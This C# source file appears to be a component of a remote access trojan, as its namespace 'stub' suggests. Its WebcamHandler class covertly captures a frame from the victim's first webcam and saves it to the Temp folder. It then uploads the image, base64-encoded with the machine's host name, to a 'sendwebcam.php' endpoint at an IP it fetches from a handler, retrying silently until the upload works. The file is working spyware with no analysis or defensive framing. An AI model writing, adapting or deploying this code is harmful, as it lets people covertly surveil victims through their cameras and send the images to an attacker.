using System;
using System.Collections.Specialized;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Windows;
using AForge.Video;
using AForge.Video.DirectShow;


namespace stub
{
    internal class WebcamHandler
    {
        static WebClient wc = WebClientHandler.wcReturn();

        static string letter = DriveGet.getdrives();
        static string user = Environment.UserName;
        static string path = letter + @"Users\" + user + @"\AppData\Local\Temp\snap.jpg";

        static MemoryStream ms;
        static Bitmap image;

        static FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
        static VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);


        public static void StartWebcamCapture()
        {
            if (File.Exists(path))
            {
                File.Delete(path);
            }
            videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
            videoSource.Start();
        }

        private static void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            bool saved = false;

            ms = new MemoryStream();
            image = new Bitmap(eventArgs.Frame);
            
            image.Save(path, ImageFormat.Jpeg);
            image.Save(ms, ImageFormat.Jpeg);

            do
            {
                if (File.Exists(path))
                {
                    saved = true;
                    videoSource.SignalToStop();
                }
            } while (!saved);
            WebUpload(ms);
        }

        private static void WebUpload(MemoryStream upload)
        {
            bool onlyOnce = false;
            do
            {
                try
                {
                    NameValueCollection nameValues = new NameValueCollection();
                    nameValues.Add("client", Dns.GetHostName());
                    nameValues.Add("webcam", Convert.ToBase64String(upload.ToArray()));


                    wc.UploadValues("http://" + ConnectionIPHandler.GetIP() + "/sendwebcam.php", nameValues);
                    onlyOnce = true;
                }
                catch { }
            } while (!onlyOnce);
        }
    }
}
